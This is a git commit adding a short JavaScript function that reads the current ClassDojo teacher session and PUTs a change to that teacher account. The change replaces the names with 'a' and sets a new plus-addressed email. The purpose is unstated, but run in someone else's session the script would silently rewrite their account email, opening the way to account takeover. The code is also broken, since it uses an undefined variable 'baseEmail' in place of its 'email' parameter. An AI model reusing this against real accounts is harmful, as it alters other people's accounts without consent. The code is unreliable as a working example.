bf0007c8a453f029ccb0be061e4b17d41b214ad7
emre-bi <126341187+emre-bi@users.noreply.github.com>
2024-08-03 22:13:14 +0300

    Create emailUpdate.js

---
+++ emailUpdate.js
@@ -0,0 +1,20 @@
+function updateTeacherEmail(email) {
+    fetch('https://teach.classdojo.com/api/session')
+      .then(response => response.json())
+      .then(data => {
+        var teacherId = data.teacher._id;
+        var [localPart, domain] = baseEmail.split('@');
+        var dynamicEmail = `${localPart}+${teacherId}@${domain}`;
+        fetch('https://teach.classdojo.com/api/teacher/' + teacherId, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            _id: teacherId,
+            title: 'a',
+            firstName: 'a',
+            lastName: 'a',
+            emailAddress: dynamicEmail
+          })
+        });
+      });
+}
